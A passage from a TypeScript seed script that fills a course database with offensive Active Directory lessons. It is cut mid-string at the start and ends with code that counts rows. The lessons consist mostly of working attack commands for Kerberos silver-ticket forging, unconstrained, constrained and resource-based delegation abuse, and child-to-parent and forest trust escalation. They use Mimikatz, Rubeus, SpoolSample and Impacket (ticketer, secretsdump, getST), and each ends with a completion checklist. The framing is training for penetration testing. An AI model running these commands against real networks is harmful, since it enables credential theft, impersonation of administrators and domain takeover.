-------         ---                     ---
CIFS            cifs/host.domain.com    File shares
HTTP            http/host.domain.com    Web services
MSSQL           MSSQLSvc/host:1433      SQL Server
LDAP            ldap/host.domain.com    Directory
HOST            host/host.domain.com    WMI, PSRemoting
\`\`\`

### Create Silver Ticket
\`\`\`powershell
# Get service account hash (Kerberoast or local)
# Computer accounts: SYSTEM hive or Mimikatz

# Mimikatz - CIFS silver ticket for file share access
mimikatz# kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /target:fileserver.corp.com /service:cifs /rc4:<service_account_hash> /ptt

# For computer account: use machine account hash
# Get from: sekurlsa::logonpasswords on the target
# Or from: secretsdump local SAM
\`\`\`

### Impacket
\`\`\`bash
# Create silver ticket for CIFS
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain corp.com -spn cifs/fileserver.corp.com user

# Use for SMB access
export KRB5CCNAME=user.ccache
smbclient.py -k -no-pass corp.com/user@fileserver.corp.com
\`\`\`

### Practical Examples
\`\`\`powershell
# Access file share
mimikatz# kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-... /target:fs01 /service:cifs /rc4:hash /ptt
dir \\\\fs01\\share$

# WMI execution (needs HOST + RPCSS)
# Access MSSQL
mimikatz# kerberos::golden ... /target:sql01 /service:MSSQLSvc /rc4:hash /ptt
sqlcmd -S sql01.corp.com -E
\`\`\`

### Advantages
\`\`\`
- No DC logging (no TGS request)
- Stealthier than golden ticket
- Can be forged offline
- Works until service password changed
\`\`\`

## Completion Criteria
- [ ] Understand TGS vs TGT
- [ ] Get service account hash
- [ ] Create silver ticket
- [ ] Access target service`],

				['Implement delegation abuse', 'Unconstrained: extract TGTs from memory when admin connects. Constrained: S4U2Self + S4U2Proxy to impersonate users. RBCD: modify msDS-AllowedToActOnBehalfOfOtherIdentity.',
`## Kerberos Delegation Abuse

### Unconstrained Delegation
\`\`\`
Computer trusts this user for delegation to any service

When user authenticates to server with unconstrained delegation:
- User's TGT is sent along with service ticket
- TGT stored in server's memory
- Can be extracted and reused

Attack:
1. Compromise machine with unconstrained delegation
2. Coerce admin to authenticate (print spooler, etc.)
3. Extract admin's TGT from memory
4. Use TGT to access any service as admin
\`\`\`

\`\`\`powershell
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Monitor for incoming TGTs
Rubeus.exe monitor /interval:5

# Coerce authentication (print spooler)
SpoolSample.exe targetserver attackerserver

# Extract TGT from memory
mimikatz# sekurlsa::tickets /export
\`\`\`

### Constrained Delegation
\`\`\`
Computer can delegate to specific services only
Uses S4U (Service for User) extensions

S4U2Self: Request ticket to self on behalf of user
S4U2Proxy: Use that ticket to access allowed services
\`\`\`

\`\`\`powershell
# Find constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# If you compromise this computer:
Rubeus.exe s4u /user:webserver$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.com /ptt
\`\`\`

### Resource-Based Constrained Delegation (RBCD)
\`\`\`
Delegation controlled by TARGET not source
If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on target:
Can configure any computer to delegate to that target
\`\`\`

\`\`\`powershell
# Check write permissions to computer object
# If you have GenericWrite, WriteProperty, etc.

# Create computer account (any user can create up to 10)
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Set RBCD on target (need write access)
$sid = (Get-ADComputer FAKE01).SID
Set-ADComputer targetserver -PrincipalsAllowedToDelegateToAccount FAKE01$

# Now use FAKE01 to impersonate anyone to targetserver
Rubeus.exe s4u /user:FAKE01$ /rc4:... /impersonateuser:Administrator /msdsspn:cifs/targetserver /ptt
\`\`\`

## Completion Criteria
- [ ] Find delegation configurations
- [ ] Exploit unconstrained delegation
- [ ] Abuse constrained delegation
- [ ] Set up RBCD attack`],

				['Build trust attacks', 'Cross-domain: inter-realm TGT with SID history. Forest: krbtgt trust key. Child-to-parent: escalate from child domain to forest root. ExtraSIDs to add Enterprise Admins SID.',
`## Trust Relationship Attacks

### Trust Types
\`\`\`
Parent-Child: Automatic bidirectional trust within forest
Forest: Between forests, can be one-way or two-way
External: To external domain, no SID filtering by default
\`\`\`

### Child-to-Parent Escalation
\`\`\`powershell
# From child domain, escalate to parent (forest root)
# Need: child domain krbtgt hash + trust key (or child domain admin)

# Get trust key
mimikatz# lsadump::trust /patch
# Or
mimikatz# lsadump::dcsync /domain:child.corp.com /user:CHILD$

# Create inter-realm TGT with Enterprise Admins SID in SID History
mimikatz# kerberos::golden /user:Administrator /domain:child.corp.com /sid:S-1-5-21-<child-sid> /sids:S-1-5-21-<parent-sid>-519 /krbtgt:<child_krbtgt_hash> /ptt

# Now have Enterprise Admin in parent domain
dir \\\\parentdc.corp.com\\c$
\`\`\`

### ExtraSIDs Attack
\`\`\`
When creating golden ticket across trust:
- Add parent domain's Enterprise Admins SID (519)
- Or Domain Admins SID (512) of parent

SID History: S-1-5-21-<PARENT>-519
Added to PAC in forged ticket
Grants Enterprise Admin rights in parent
\`\`\`

### Forest Trust Abuse
\`\`\`powershell
# Get forest trust key (inter-forest trust account)
mimikatz# lsadump::trust /patch

# Create ticket with SID from other forest
# Note: SID filtering may block >1000 RIDs
# Use SIDs like Enterprise Admins (519) that pass filter
\`\`\`

### Impacket Trust Attacks
\`\`\`bash
# Dump trust keys
secretsdump.py child.corp.com/admin:password@childdc.child.corp.com -just-dc-user 'CHILD$'

# Create inter-realm TGT
ticketer.py -nthash <trust_key> -domain-sid S-1-5-21-<child> -domain child.corp.com -extra-sid S-1-5-21-<parent>-519 Administrator

# Request TGS in parent domain
getST.py -k -no-pass -spn cifs/parentdc.corp.com child.corp.com/Administrator@parent.corp.com
\`\`\`

### SID Filtering
\`\`\`
External trusts filter SIDs by default:
- Blocks SIDs not from trusted domain
- Prevents adding Enterprise Admins from other domains

Bypass:
- If SID filtering disabled (quarantine disabled)
- Internal forest trusts don't filter
- Or use SIDs that pass filter (same forest)
\`\`\`

## Completion Criteria
- [ ] Enumerate trust relationships
- [ ] Get trust keys
- [ ] Create inter-realm ticket
- [ ] Escalate across trust`],
			]);
		}
	}
});

console.log(`\nExpanded ${expanded} paths`);

const counts = db.prepare(`
  SELECT
    (SELECT COUNT(*) FROM paths) as paths,
    (SELECT COUNT(*) FROM modules) as modules,
    (SELECT COUNT(*) FROM tasks) as tasks
`).get() as { paths: number; modules: number; tasks: number };

console.log(`Final: ${counts.paths} paths, ${counts.modules} modules, ${counts.tasks} tasks`);

db.close();
